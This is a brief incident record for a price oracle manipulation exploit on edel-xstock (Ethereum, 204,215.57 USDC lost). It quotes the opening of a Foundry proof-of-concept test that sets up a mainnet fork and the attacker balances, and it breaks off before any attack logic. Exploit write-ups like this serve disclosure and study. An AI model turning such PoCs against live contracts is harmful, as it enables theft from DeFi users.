# [?] edel-xstock - Price Oracle Manipulation

## Summary
Severity: Unknown
Chain: Ethereum
Component: edel-xstock
Published: 2026-07-01
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-07/edel-xstock_exp.sol
Type: defi-exploit-poc

## Details
Lost: 204,215.57 USDC

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        multiAssetLog = true;
        attacker = ATTACKER;
        _addFundingToken(USDC_TOKEN);
        _addFundingToken(WSPYX_TOKEN);
        _addFundingToken(WQQQX_TOKEN);
        _addFundingToken(WMSTRX_TOKEN);
        _addFundingToken(WNVDAX_TOKEN);
        _addFundingToken(WTSLAX_TOKEN);

        vm.label(ATTACKER, "Attacker");
        vm.label(EDEL_POOL, "Edel Pool Proxy");
        vm.label(MORPHO, "Morpho Blue");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(WGOOGLX_TOKEN, "wGOOGLx");
        vm.label(GOOGLX_TOKEN, "GOOGLx");
        vm.label(WSPYX_TOKEN, "wSPYx");
        vm.label(WQQQX_TOKEN, "wQQQx");
        vm.label(WMSTRX_TOKEN, "wMSTRx");
        vm.label(WNVDAX_TOKEN, "wNVDAx");
        vm.label(WTSLAX_TOKEN, "wTSLAx");
    }

    function testExploit() public balanceLog {
        uint256 usdcBefore = IERC20(USDC_TOKEN).balanceOf(ATTACKER);
        uint256 spyBefore = IERC20(WSPYX_TOKEN).balanceOf(ATTACKER);
        uint256 qqqBefore = IERC20(WQQQX_TOKEN).balanceOf(ATTACKER);
        uint256 mstrBefore = IERC20(WMSTRX_TOKEN).balanceOf(ATTACKER);
        uint256 nvdaBefore = IERC20(WNVDAX_TOKEN).balanceOf(ATTACKER);
        uint256 tslaBefore = IERC20(WTSLAX_TOKEN).balanceOf(ATTACKER);

        vm.prank(ATTACKER);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-07/edel-xstock_exp.sol_
